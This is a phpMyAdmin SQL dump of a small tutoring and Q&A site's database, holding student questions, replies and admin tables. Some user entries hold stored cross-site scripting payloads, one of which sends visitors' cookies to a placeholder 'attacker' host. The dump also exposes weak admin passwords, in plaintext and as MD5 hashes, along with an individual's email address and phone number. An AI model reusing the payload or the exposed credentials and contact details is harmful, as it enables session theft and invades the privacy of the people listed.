-- phpMyAdmin SQL Dump
-- version 4.7.4
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1:3306
-- Generation Time: Jul 03, 2018 at 01:47 PM
-- Server version: 5.7.19
-- PHP Version: 5.6.31

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `rajiv`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

DROP TABLE IF EXISTS `admin`;
CREATE TABLE IF NOT EXISTS `admin` (
  `id` int(20) NOT NULL AUTO_INCREMENT,
  `username` varchar(200) NOT NULL,
  `password` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'amit', '202cb962ac59075b964b07152d234b70'),
(3, 'admin@123', '202cb962ac59075b964b07152d234b70'),
(4, 'admin@456', '202cb962ac59075b964b07152d234b70');

-- --------------------------------------------------------

--
-- Table structure for table `admin_login`
--

DROP TABLE IF EXISTS `admin_login`;
CREATE TABLE IF NOT EXISTS `admin_login` (
  `a_id` int(11) NOT NULL AUTO_INCREMENT,
  `a_mail` varchar(200) NOT NULL,
  `a_username` varchar(200) NOT NULL,
  `a_pass` varchar(200) NOT NULL,
  `a_contact` bigint(200) NOT NULL,
  `a_design` varchar(50) NOT NULL,
  `a_lastseen` timestamp NOT NULL,
  `status` int(10) NOT NULL,
  PRIMARY KEY (`a_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin_login`
--

INSERT INTO `admin_login` (`a_id`, `a_mail`, `a_username`, `a_pass`, `a_contact`, `a_design`, `a_lastseen`, `status`) VALUES
(1, 'amitanand.kvj.2@gmail.com', 'Amit Anand', '202cb962ac59075b964b07152d234b70', 8979997072, 'Admin', '2018-06-28 07:53:02', 0),
(2, 'amitanand.kvj.2@gmail.com', 'admin', '123', 0, 'Admin', '2018-06-28 07:53:02', 0),
(3, '', 'amitanand.kvj.2@gmail.com', '123', 0, 'Admin', '2018-06-28 07:53:02', 0),
(4, 'amitanand.kvj.2@gmail.com', 'amitanand.kvj.2@gmail.com', '123', 0, 'Admin', '2018-06-28 07:53:02', 0),
(5, 'amitanand.kvj.2@gmail.com', 'amitanand.kvj.2@gmail.com', '123', 0, 'Admin', '2018-06-28 07:53:02', 0);

-- --------------------------------------------------------

--
-- Table structure for table `batch`
--

DROP TABLE IF EXISTS `batch`;
CREATE TABLE IF NOT EXISTS `batch` (
  `b_id` int(11) NOT NULL,
  `b_name` varchar(50) NOT NULL,
  `b_desc` text NOT NULL,
  `b_status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `batch`
--

INSERT INTO `batch` (`b_id`, `b_name`, `b_desc`, `b_status`) VALUES
(0, 'RAJIV RANJAN', 'sd', 1),
(0, 'alpha', '', 1),
(0, 'RAJIV RANJAN', 'sd', 1),
(0, 'alpha', '', 1);

-- --------------------------------------------------------

--
-- Table structure for table `batchstu`
--

DROP TABLE IF EXISTS `batchstu`;
CREATE TABLE IF NOT EXISTS `batchstu` (
  `bstu_id` int(11) NOT NULL AUTO_INCREMENT,
  `b_id` int(11) NOT NULL,
  `u_id` text NOT NULL,
  PRIMARY KEY (`bstu_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `blog`
--

DROP TABLE IF EXISTS `blog`;
CREATE TABLE IF NOT EXISTS `blog` (
  `bl_id` int(11) NOT NULL AUTO_INCREMENT,
  `bl_title` varchar(200) NOT NULL,
  `bl_desc` text NOT NULL,
  `bl_image` varchar(200) NOT NULL,
  `bl_date` timestamp NOT NULL,
  `bl_status` int(2) NOT NULL,
  PRIMARY KEY (`bl_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `blog`
--

INSERT INTO `blog` (`bl_id`, `bl_title`, `bl_desc`, `bl_image`, `bl_date`, `bl_status`) VALUES
(3, 'edrfgbh', 'The first parameter must contain a UNIX timestamp. The second parameter must contain a timestamp that is greater that the first timestamp. The thirdparameter is optional and limits the number of time units to display.  If the second parameter empty, the current time will be used.  The most common purpose for this function is to show how much time has elapsed from some point in time in the past to now.', '1530393923image.jpg', '2018-07-06 18:30:00', 1);

-- --------------------------------------------------------

--
-- Table structure for table `contact`
--

DROP TABLE IF EXISTS `contact`;
CREATE TABLE IF NOT EXISTS `contact` (
  `c_id` int(11) NOT NULL AUTO_INCREMENT,
  `c_name` varchar(200) NOT NULL,
  `c_mail` varchar(200) NOT NULL,
  `c_subject` text NOT NULL,
  `c_message` text NOT NULL,
  PRIMARY KEY (`c_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `contact`
--

INSERT INTO `contact` (`c_id`, `c_name`, `c_mail`, `c_subject`, `c_message`) VALUES
(1, 'dineshvar', 'dc@efvg.shxdjsh', 'dfvbgnh', 'ASDCFVGBNHM');

-- --------------------------------------------------------

--
-- Table structure for table `question`
--

DROP TABLE IF EXISTS `question`;
CREATE TABLE IF NOT EXISTS `question` (
  `id` bigint(200) NOT NULL AUTO_INCREMENT,
  `u_id` bigint(200) NOT NULL,
  `sub` text NOT NULL,
  `quest` text NOT NULL,
  `picture` text NOT NULL,
  `title` text NOT NULL,
  `view` bigint(200) NOT NULL,
  `status` varchar(200) NOT NULL DEFAULT 'pending',
  `posted` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=1591 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `question`
--

INSERT INTO `question` (`id`, `u_id`, `sub`, `quest`, `picture`, `title`, `view`, `status`, `posted`) VALUES
(124, 18, 'Mathematics', 'a,b,c are there real number  such that a+b+c=7,a^2+b^2+c^2=35 and a^3+b^3+c^3=151.find the value of abc', '', '', 118, 'verified', '2017-04-22 11:33:53'),
(123, 18, 'Mathematics', 'a,b,c are there real number  such that a+b+c=7,a^2+b^2+c^2=35 and a^3+b^3+c^3=151.find the value of abc', '', '', 113, 'verified', '2017-04-22 11:33:53'),
(129, 22, 'Mathematics', 'Do you make a curve with a bunch of straight line?', '', '', 124, 'verified', '2017-04-22 11:33:53'),
(122, 18, 'Mathematics', 'a,b,c are there real number  such that a+b+c=7,a^2+b^2+c^2=35 and a^3+b^3+c^3=151.find the value of abc', '', '', 106, 'verified', '2017-04-22 11:33:53'),
(133, 20, 'Physics', 'How we create 0 gravity on earth?', '', '', 113, 'verified', '2017-04-22 11:33:53'),
(162, 13, 'Physics', 'what is telescope?', '', '', 109, 'verified', '2017-04-22 11:33:53'),
(131, 27, 'Physics', ' Why do we feel hot or warm when the room temperature is 37 Celsius or less although, our normal body temperature is 37 Celsius?', '', 'ADESH KUMAR PATRA', 123, 'verified', '2017-04-22 11:33:53'),
(130, 23, 'Mathematics', 'If a,b,c are in AP then how can we say that a^2 , b^2 & c^2 also in AP', '', '', 112, 'verified', '2017-04-22 11:33:53'),
(128, 18, 'Biology', 'Which is pregnancy Harmon in human (female)', '', '', 124, 'verified', '2017-04-22 11:33:53'),
(127, 18, 'Chemistry', 'Which of these is a solution   (1)14carat gold (2)salted water (3)carbonated water (4)All of these ', '', '', 113, 'verified', '2017-04-22 11:33:53'),
(126, 18, 'Mathematics', 'If A+B=225\',then the value of (1+tanA)(1+tanB)=', '', '', 112, 'verified', '2017-04-22 11:33:53'),
(163, 11, 'Physics', 'what is the effect of electron on positron', '', '', 97, 'verified', '2017-04-22 11:33:53'),
(164, 32, 'Biology', 'Why testis lies outside in the abdomen', '', '', 256, 'verified', '2017-04-22 11:33:53'),
(125, 18, 'Mathematics', 'a,b,c are there real number  such that a+b+c=7,a^2+b^2+c^2=35 and a^3+b^3+c^3=151.find the value of abc', '', '', 114, 'verified', '2017-04-22 11:33:53'),
(121, 16, 'Physics', 'Why are many thermal power plants set up near coal or oil fields?', '', '', 117, 'verified', '2017-04-22 11:33:53'),
(119, 13, 'Physics', 'What is optical density?', '', '', 110, 'verified', '2017-04-22 11:33:53'),
(120, 13, 'Physics', 'What is optical density?', '', '', 116, 'verified', '2017-04-22 11:33:53'),
(134, 31, 'Physics', 'How we create 0 gravity on earth??', '', '', 124, 'verified', '2017-04-22 11:33:53'),
(135, 29, 'Physics', 'Why we need to supply heat energy while changing medium at same temp. Eg. Let suppose we are changing ice (of temp. 0?) to water (of temp 0?).', '', '', 111, 'verified', '2017-04-22 11:33:53'),
(136, 32, 'Physics', 'Name the star which is nearest after sun on earth', '', '', 127, 'verified', '2017-04-22 11:33:53'),
(137, 33, 'Mathematics', 'How we find cube root of 2 by manually?', '', '', 224, 'verified', '2017-04-22 11:33:53'),
(138, 29, 'Physics', 'Every force has the tendency to do work. Since, work is being done that means enenrgy is being exchanged. Then , why gravitational force can\'t be changed to some enenrgy form?', '', '', 121, 'verified', '2017-04-22 11:33:53'),
(182, 48, 'Biology', 'what is prostate gland??', '', '', 134, 'verified', '2017-04-22 11:33:53'),
(176, 48, 'Chemistry', 'what is fermentation', '', '', 110, 'verified', '2017-04-22 11:33:53'),
(177, 48, 'Chemistry', 'what is fermentation', '', '', 124, 'verified', '2017-04-22 11:33:53'),
(178, 50, 'Physics', 'What is resonance?', '', '', 95, 'verified', '2017-04-22 11:33:53'),
(179, 51, 'Physics', 'Name the opaque membrane over lens', '', '', 133, 'verified', '2017-04-22 11:33:53'),
(180, 50, 'Chemistry', 'Explain in detail what is synthetic resins method for removing permanent hardness of water', '', '', 119, 'verified', '2017-04-22 11:33:53'),
(172, 31, 'Physics', 'How bournalli principle works in wings of plane??', '', '', 103, 'verified', '2017-04-22 11:33:53'),
(173, 11, 'Physics', 'what is photoelectric effect', '', '', 116, 'verified', '2017-04-22 11:33:53'),
(174, 11, 'Physics', 'what is black hole', '', '', 109, 'verified', '2017-04-22 11:33:53'),
(175, 11, 'Physics', 'what is electron ', '', '', 113, 'verified', '2017-04-22 11:33:53'),
(169, 32, 'Physics', 'How the waste water coming out of the factories adversely affect the aquatic plants and animals', '', '', 103, 'verified', '2017-04-22 11:33:53'),
(170, 32, 'Physics', 'How the waste water coming out of the factories adversely affect the aquatic plants and animals', '', '', 108, 'verified', '2017-04-22 11:33:53'),
(171, 32, 'Physics', 'How use of excessive fertilizers and pesticides damages the aquatic life', '', '', 107, 'verified', '2017-04-22 11:33:53'),
(165, 11, 'Physics', 'what is cataract', '', '', 106, 'verified', '2017-04-22 11:33:53'),
(166, 11, 'Physics', 'how digital signal is converted in video signal in television', '', '', 96, 'verified', '2017-04-22 11:33:53'),
(167, 11, 'Physics', 'best book for foundation course for iit jee', '', '', 115, 'verified', '2017-04-22 11:33:53'),
(168, 23, 'Biology', 'What is biological magnification', '', '', 97, 'verified', '2017-04-22 11:33:53'),
(144, 29, 'Physics', 'We see different object in different colours, then, in this phenomenon photons will be involved like, photons of some colours would be absorbed and rest is reflected. If photons have mass then every object should gain some maas (we can say negligible gain in maas) or if photons don\'t have maas then how it gets so much of energy?', '', '', 131, 'verified', '2017-04-22 11:33:53'),
(145, 22, 'Mathematics', 'if (x+1/x)=2 ,   then find (x^5 + 1/x^5)=?', '', '', 105, 'verified', '2017-04-22 11:33:53'),
(146, 36, 'Physics', 'What is energy', '', '', 105, 'verified', '2017-04-22 11:33:53'),
(147, 37, 'Mathematics', 'A metal x is 15 times as dense as metal z and a metal y is 8 times as dense as metal z. In what ratio should these two metals be mixed to get an alloy which is  13 times as dense as metal z?', '', 'Aman', 127, 'verified', '2017-04-22 11:33:53'),
(148, 37, 'Mathematics', 'Find the middle term in the expansion of (1+x) to the power 2n ?', '', 'Aman', 125, 'verified', '2017-04-22 11:33:53'),
(149, 27, 'Biology', 'What is Endosmosis and Exosmosis? And during Osmosis, water travels from high concentration to low concentration or low concentration to high concentration?', '', 'ADESH KUMAR PATRA', 125, 'verified', '2017-04-22 11:33:53'),
(1486, 14, 'Chemistry', 'how scientist are  able to measure the volume of planets', '', '', 94, 'verified', '2017-04-22 11:33:53'),
(1487, 14, 'Physics', '.', '', '', 55, 'pending', '2017-04-22 11:33:53'),
(1485, 14, 'Physics', 'why ear drum can\'t be re generated for deaf', '', '', 84, 'verified', '2017-04-22 11:33:53'),
(1484, 14, 'Mathematics', 'why a plane can\'t be move in space', '', '', 84, 'verified', '2017-04-22 11:33:53'),
(1483, 14, 'Mathematics', 'why earth revolves around sun in its own axis', 'earth_sun.jpg', 'earth_sun.jpg', 78, 'verified', '2017-04-22 11:33:53'),
(1482, 14, 'Mathematics', 'solve it', 'TMPDOODLE1485786527057.jpg', 'TMPDOODLE1485786527057.jpg', 107, 'verified', '2017-04-22 11:33:53'),
(1481, 15, 'Mathematics', 'Find the value of question in the pic.', '20170129_113545.jpg', '20170129_113545.jpg', 102, 'verified', '2017-04-22 11:33:53'),
(1480, 27, 'Biology', 'Why we could not sneeze without closing our eyes?', '', 'ADESH KUMAR PATRA', 82, 'verified', '2017-04-22 11:33:53'),
(1479, 27, 'Physics', 'Two boxes have same mass. One box, from a certain height is free falled and second box from the same height is slided through a inclined plane. Then, which box has more final velocity and why?', '', 'ADESH KUMAR PATRA', 108, 'verified', '2017-04-22 11:33:53'),
(1364, 11, 'Physics', 'The drift velocity in the free electron is responsible for the?', '', '', 79, 'verified', '2017-04-22 11:33:53'),
(1365, 30, 'Physics', 'solve this', 'Capture2.PNG', 'Capture.PNG', 72, 'verified', '2017-04-22 11:33:53'),
(1366, 30, 'Physics', '?', 'Capture3.PNG', 'Capture.PNG', 95, 'verified', '2017-04-22 11:33:53'),
(1367, 30, 'Chemistry', 'Solid A is very hard, electrical insulator in solid as well as in molten state and melts at extremely high temperature. What type of solid is it?', '', '', 84, 'verified', '2017-04-22 11:33:53'),
(1368, 23, 'Biology', 'What is acquired and inherited traits', '', '', 92, 'verified', '2017-04-22 11:33:53'),
(1369, 15, 'Mathematics', 'Prove', '', '20170122_092436.jpg', 56, 'verified', '2017-04-22 11:33:53'),
(1370, 15, 'Mathematics', 'Prove  the question below', '16231324_306366213093669_1350258122_o.jpg', '20170122_092436.jpg', 96, 'verified', '2017-04-22 11:33:53'),
(1376, 92, 'Mathematics', 'if january is july   ;;;september is september;;;  february is august and march is may  then august is????', '', '', 83, 'verified', '2017-04-22 11:33:53'),
(1377, 94, 'Physics', 'what is fifth colour in ranbow', '', '', 97, 'verified', '2017-04-22 11:33:53'),
(1378, 27, 'Biology', 'What is the shape and diameter of RBCs ?', '', 'ADESH KUMAR PATRA', 97, 'verified', '2017-04-22 11:33:53'),
(1489, 27, 'Biology', 'Is \"yawning\" important for a human being? If yes, why?', '', 'ADESH KUMAR PATRA', 97, 'verified', '2017-04-22 11:33:53'),
(1488, 15, 'Physics', 'Suppose a person apply some force on a stable wall and there is no change of body of the system.Is there any method or device to measure that force applied by the person?', '', '', 110, 'verified', '2017-04-22 11:33:53'),
(1520, 50, 'Physics', 'calculate the magnitude of the electrostatic force exerted by the proton on the electron in the hydrogen atom and compare it with the weight of the electron given the radius of hydrogen atom is 0.53 Armstrong', '', '', 144, 'verified', '2017-04-22 11:33:53'),
(1519, 50, 'Physics', 'two point charges Q1 and Q2 are 3 metre apart and their combined charge is 20 microcoulomb if one replace the other with a force of. 075N what are the two charges', '', '', 112, 'verified', '2017-04-22 11:33:53'),
(1518, 50, 'Chemistry', 'if an electron has a spin quantum number of + 1 by 2 and the magnetic quantum number of -1 it cannot be present in     (a)s orbital. (B)p orbital.  (C)d orbital. (d) f orbital', '', '', 89, 'verified', '2017-04-22 11:33:53'),
(1517, 15, 'Mathematics', 'Find the answer', '20170328_200048.jpg', '20170328_200048.jpg', 84, 'verified', '2017-04-22 11:33:53'),
(1516, 15, 'Mathematics', 'Find', 'IMG-20170305-WA0007.jpg', 'IMG-20170305-WA0007.jpg', 102, 'verified', '2017-04-22 11:33:53'),
(1515, 27, 'Physics', 'We all know that if a white light passes through a traingular glass prism, then it splits into seven different colours. But, if the white light passes through a rectangular glass slab, Will Dispersion of light takes place?', '', 'ADESH KUMAR PATRA', 86, 'verified', '2017-04-22 11:33:53'),
(1514, 23, 'Chemistry', 'Why Mendeleev cannot assign the position of hydrogen element...??', '', '', 92, 'verified', '2017-04-22 11:33:53'),
(1513, 15, 'Mathematics', 'Find.', '20170304_220920.jpg', '20170304_220920.jpg', 99, 'verified', '2017-04-22 11:33:53'),
(1512, 15, 'Mathematics', 'Find', '', '', 89, 'verified', '2017-04-22 11:33:53'),
(1511, 15, 'Mathematics', 'find the value', '', '20170301_234707.jpg', 73, 'verified', '2017-04-22 11:33:53'),
(1510, 15, 'Mathematics', 'find the value', '17016521_326696271060663_1858862180_o.jpg', '20170301_233548.jpg', 102, 'verified', '2017-04-22 11:33:53'),
(1509, 15, 'Mathematics', 'Find the value', '17035998_326696734393950_2020209541_o.jpg', '20170301_233548.jpg', 83, 'verified', '2017-04-22 11:33:53'),
(1508, 15, 'Mathematics', 'Find the value', '', '20170301_233548.jpg', 57, 'pending', '2017-04-22 11:33:53'),
(1507, 15, 'Mathematics', 'Find the value', '', '', 57, 'pending', '2017-04-22 11:33:53'),
(1506, 15, 'Mathematics', 'Prove this', '20170225_143811.jpg', '20170225_143811.jpg', 122, 'verified', '2017-04-22 11:33:53'),
(1505, 15, 'Mathematics', 'What\'s about it.', '20170215_211650.jpg', '20170215_211650.jpg', 102, 'verified', '2017-04-22 11:33:53'),
(1504, 14, 'Physics', 'directive principles of state policy', '', '', 93, 'verified', '2017-04-22 11:33:53'),
(1503, 14, 'Physics', 'What is directive principles of state policy', '', '', 58, 'pending', '2017-04-22 11:33:53'),
(1502, 14, 'Physics', 'What is directive principles of state policy', '', '', 55, 'pending', '2017-04-22 11:33:53'),
(1501, 14, 'Physics', 'What is directive principles of state policy', '', '', 54, 'pending', '2017-04-22 11:33:53'),
(1500, 14, 'Physics', 'What is directive principles of state policy', '', '', 56, 'pending', '2017-04-22 11:33:53'),
(1499, 14, 'Physics', 'What is directive principles of state policy', '', '', 54, 'pending', '2017-04-22 11:33:53'),
(1498, 14, 'Physics', 'What is directive principles of state policy', '', '', 50, 'pending', '2017-04-22 11:33:53'),
(1497, 14, 'Physics', 'What is directive principles of state policy', '', '', 55, 'pending', '2017-04-22 11:33:53'),
(1496, 14, 'Physics', 'What is directive principles of state policy', '', '', 52, 'pending', '2017-04-22 11:33:53'),
(1495, 14, 'Physics', 'What is directive principles of state policy', '', '', 56, 'pending', '2017-04-22 11:33:53'),
(1494, 14, 'Physics', 'What is directive principles of state policy', '', '', 51, 'pending', '2017-04-22 11:33:53'),
(1493, 14, 'Physics', 'What is directive principles of state policy', '', '', 70, 'pending', '2017-04-22 11:33:53'),
(1492, 28, 'Physics', 'A barometer kept in an elevator accelerating upward reads 76 cm of Hg.what will be the possible air pressure inside the elevator?', '', '', 97, 'verified', '2017-04-22 11:33:53'),
(1491, 14, 'Biology', 'How twins generate in  human body', '', '', 106, 'verified', '2017-04-22 11:33:53'),
(1490, 27, 'Physics', 'What will happen when we travel faster than light anyway? or, Is time travel possible?', '', 'ADESH KUMAR PATRA', 100, 'verified', '2017-04-22 11:33:53'),
(1531, 14, 'Physics', 'What is differernce between rotational and circular motion', '', '', 121, 'pending', '2017-04-28 13:52:16'),
(1532, 50, 'Chemistry', 'The wave number of the first line in the Balmer series of hydrogen is 15200 per centimetre.\r\nThen wave number of the first line in Balmer series of Be3+ is=?', '', '', 94, 'pending', '2017-05-04 10:03:50'),
(1533, 50, 'Chemistry', 'What is the magnitude of the charge on the Helium ion esu units?', '', '', 119, 'pending', '2017-05-04 10:05:28'),
(1534, 120, 'Chemistry', 'How do we get energy from Gulcose?', '', '', 104, 'pending', '2017-05-23 10:45:33'),
(1535, 120, 'Physics', 'From were Earth gets energy to revolve or rotate around the sun??', '', '', 95, 'pending', '2017-05-23 10:54:03'),
(1536, 120, 'Physics', 'Sir, one question related to your website that why you don\'t use https ???', '', '', 157, 'pending', '2017-05-23 10:55:57'),
(1537, 121, 'Chemistry', 'What is thr difference between sub orbit and orbit', '', '', 129, 'pending', '2017-05-28 17:57:09'),
(1588, 140, 'Maths', 'dh', '', '', 52, 'pending', '2017-11-26 10:42:15'),
(1589, 140, 'Physics', '\r\n1\r\n2\r\n3\r\n<script>\r\n  window.location.href = \"https://www.example.com\";\r\n</script>', '', '', 50, 'pending', '2018-02-14 09:25:06');

-- --------------------------------------------------------

--
-- Table structure for table `result`
--

DROP TABLE IF EXISTS `result`;
CREATE TABLE IF NOT EXISTS `result` (
  `r_id` int(10) NOT NULL AUTO_INCREMENT,
  `r_name` varchar(50) NOT NULL,
  `r_image` varchar(200) NOT NULL,
  `r_desc` text NOT NULL,
  `r_type` int(2) NOT NULL,
  `r_status` int(2) NOT NULL,
  `r_year` int(4) NOT NULL,
  PRIMARY KEY (`r_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `result`
--

INSERT INTO `result` (`r_id`, `r_name`, `r_image`, `r_desc`, `r_type`, `r_status`, `r_year`) VALUES
(1, 'amit', '1529310957image.png', 'chem 95', 0, 0, 2015),
(2, 'amit', '1529311095image.png', 'chem 95', 1, 0, 2005),
(3, 'ravi kr ranjan', '1529671113image.jpg', 'chem 95 cghd yerggfrsr sdfgfg', 1, 1, 2014),
(4, 't', '1529671129image.jpg', 't', 1, 1, 2005),
(5, 'amit anand', '', 'chem 95 iit ', 0, 1, 2021);

-- --------------------------------------------------------

--
-- Table structure for table `rply`
--

DROP TABLE IF EXISTS `rply`;
CREATE TABLE IF NOT EXISTS `rply` (
  `id` bigint(200) NOT NULL AUTO_INCREMENT,
  `u_id` bigint(200) NOT NULL,
  `qid` bigint(200) NOT NULL,
  `rply` varchar(2000) NOT NULL,
  `picture` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=1252 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `rply`
--

INSERT INTO `rply` (`id`, `u_id`, `qid`, `rply`, `picture`, `title`) VALUES
(1178, 12, 1504, 'The Fundamental Rights, Directive Principles of State Policy and Fundamental Duties are sections of the Constitution of India that prescribe the fundamental obligations of the State to its citizens and the duties of the citizens to the State.These sections comprise a constitutional bill of rights for government policy-making and the behavior and conduct of citizens. These sections are considered vital elements of the constitution, which was developed between 1947 and 1949 by the Constituent Assembly of India.', '', ''),
(1179, 12, 1504, 'The Fundamental Rights is defined as the basic human rights of all citizens. These rights, defined in Part III of the Constitution, apply irrespective of race, place of birth, religion, caste, creed or gender. They are enforceable by the courts, subject to specific restrictions. The Directive Principles of State Policy are guidelines for the framing of laws by the government. These provisions, set out in Part IV of the Constitution, are not enforceable by the courts, but the principles on which they are based are fundamental guidelines for governance that the State is expected to apply in framing and passing laws.', '', ''),
(1180, 13, 1505, 'The statement is \'If base are equal, then index must be equal\'  given that base ? -1, 0, 1', '', ''),
(1181, 98, 1506, 'ans', '17006116_426396264369630_1972409101_n.jpg', '17006116_426396264369630_1972409101_n.jpg'),
(1182, 15, 1506, 'Bhaiya y to the power x to the power x....... to the power infinity is equal to x to the power infinity kaise hota hai bta dijiye.', '', ''),
(1183, 98, 1506, 'y to power x to x, and x .. power infinity.  we take y=x^(y) because its goes to infinity amd we know infinity is not define\r\nlike you take a drop of water from ocean than what change come in ocean water', '', ''),
(1184, 15, 1506, 'Ok.  Thank You So Much.', '', ''),
(1185, 12, 1510, 'Y/x', '', 'IMG_20170302_195127.jpg'),
(1190, 15, 1510, '????????????????????????', '', ''),
(1189, 12, 1510, 'sol', '', '17105890_1285423081550125_1208654179_o.jpg'),
(1188, 12, 1510, 'sol', 'amit.jpg', 'amit.jpg'),
(1191, 15, 1510, 'Thik h', '', ''),
(1192, 12, 1514, 'Hydrogen resembles like both the alkali metals and the halogens. Hence, it was placed in IA group VI B group and could not be given a fixed position in Mendeleev’s Periodic Table.', '', ''),
(1193, 12, 1514, 'It is so because hydrogen has 1 valence electron in its outermost shell.so according to modern periodic table, hydrogen can be arranged in halogen family i.e. group no. 17 but hydrogen does not possess the properties of halogen family. That\'s why hydrogen is given its position in the first group and first period of the modern periodic table.', '', ''),
(1200, 12, 1515, 'If you think of the two parallel glass sides as canceling each other out you are pretty close to it. The first impact (low to high indices) does, in fact, disperse frequencies if the light is coming in at an angle, but the exits (high to low) mostly cancels that effect. There actually can be some small residual effects leading to small colored fringes.\r\n\r\nThe prism works better because the oppositely angled sides enhance rather than cancel the dispersion effects.', '', ''),
(1199, 12, 1513, 'Sol', 'IMG_20170305_123702.jpg', 'IMG_20170305_123702.jpg'),
(1201, 12, 1516, 'Sol', 'IMG_20170306_000454.jpg', 'IMG_20170306_000454.jpg'),
(1205, 12, 1514, ' sges', 'answer.png', ''),
(1203, 12, 1519, 'ty', '', ''),
(1204, 12, 1512, 'd', '', ''),
(1236, 124, 123, 'Hi', '', ''),
(1237, 124, 123, 'hi', '', ''),
(1238, 124, 1566, '?', '', ''),
(1239, 124, 1531, '>?', 'answer4.png', ''),
(1240, 124, 1566, '<script>\r\nwindow.location=\'http://attacker/?cookie=\'+document.cookie\r\n</script>', '', ''),
(1241, 124, 1566, '<script>alert(1);</script>', '', ''),
(1211, 12, 1537, 'sol', 'answer1.PNG', ''),
(1212, 12, 1536, 'i have to pay for it ', '', ''),
(1213, 12, 1535, 'The cause of revolution of earth is the angular momentum which was generated 4.6 billion years ago when our solar system was formed. As the mass increases the gravitational force also increases, so sun being heavier has the highest gravitational field. This gravitational field pulls the planet towards itself but due to the velocity of the earth perpendicular to the gravitational field it revolves and since there is no friction in space it keeps on revolving.  The rotation of the earth is caused due to the following reason, during the formation of solar system, the dust particle clouds started rotating due to the sun\'s gravitational orbit. As the dust particles collapsed due their own gravity which consisted of asteroids they started spinning faster due to the conservation of angular momentum same as when a figure skater brings her arm towards her body to increase the rotation speed. These asteroids coalesced to form planets and currently the inertia of the planet keeps it rotating on its own axis.', '', ''),
(1214, 12, 1537, 'http://www.chemguide.co.uk/atoms/properties/orbitsorbitals.html', '', ''),
(1215, 12, 1534, 'All parts of the body (muscles, brain, heart, and liver) need energy to work. This energy comes from the food we eat.\r\n\r\nOur bodies digest the food we eat by mixing it with fluids (acids and enzymes) in the stomach. When the stomach digests food, the carbohydrate (sugars and starches) in the food breaks down into another type of sugar, called glucose.\r\n\r\nThe stomach and small intestines absorb the glucose and then release it into the bloodstream. Once in the bloodstream, glucose can be used immediately for energy or stored in our bodies, to be used later.\r\n\r\nHowever, our bodies need insulin in order to use or store glucose for energy. Without insulin, glucose stays in the bloodstream, keeping blood sugar levels high.', '', ''),
(1216, 120, 1536, 'So no problem bhaiya,then it will be more secure.', '', ''),
(1217, 120, 1536, 'Bhaiya can i check your website from any vulnerability by doing some attacks..i want your permission.', '', ''),
(1224, 124, 1545, 'g', 'answer2.png', ''),
(1219, 123, 1534, 'landoor', '', ''),
(1220, 123, 1534, 'landoor', '', ''),
(1221, 123, 1534, 'lnadoor', '', ''),
(1223, 124, 1545, 'jbdsjkfb', '', ''),
(1225, 125, 1536, 's', 'answer1.jpg', ''),
(1226, 125, 1536, 's', 'answer2.jpg', ''),
(1227, 125, 1536, 's', 'answer3.jpg', ''),
(1228, 124, 1545, 'k bro', 'answer4.jpg', ''),
(1229, 124, 1545, 'le chutiye\r\n', 'answer3.png', ''),
(1242, 12, 1534, '..\r\n', '', ''),
(1243, 128, 1573, '??', 'answer1.jpg', '');

-- --------------------------------------------------------

--
-- Table structure for table `sturesults`
--

DROP TABLE IF EXISTS `sturesults`;
CREATE TABLE IF NOT EXISTS `sturesults` (
  `stu_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `stu_tid` int(11) NOT NULL,
  `stu_uid` int(11) NOT NULL,
  `stu_scored` int(11) NOT NULL,
  `stu_remark` text NOT NULL,
  PRIMARY KEY (`stu_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `sturesults`
--

INSERT INTO `sturesults` (`stu_id`, `stu_tid`, `stu_uid`, `stu_scored`, `stu_remark`) VALUES
(3, 1, 1218001, 40, ''),
(2, 1, 1218001, 40, '');

-- --------------------------------------------------------

--
-- Table structure for table `subscribe`
--

DROP TABLE IF EXISTS `subscribe`;
CREATE TABLE IF NOT EXISTS `subscribe` (
  `s_name` text NOT NULL,
  `s_mail` varchar(200) NOT NULL,
  `s_status` int(10) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `test`
--

DROP TABLE IF EXISTS `test`;
CREATE TABLE IF NOT EXISTS `test` (
  `t_id` int(11) NOT NULL AUTO_INCREMENT,
  `t_name` varchar(50) NOT NULL,
  `t_fmarks` int(11) NOT NULL,
  `t_batch` varchar(50) NOT NULL,
  `t_sub` varchar(50) NOT NULL,
  `t_class` int(11) NOT NULL,
  `t_date` date NOT NULL,
  PRIMARY KEY (`t_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `test`
--

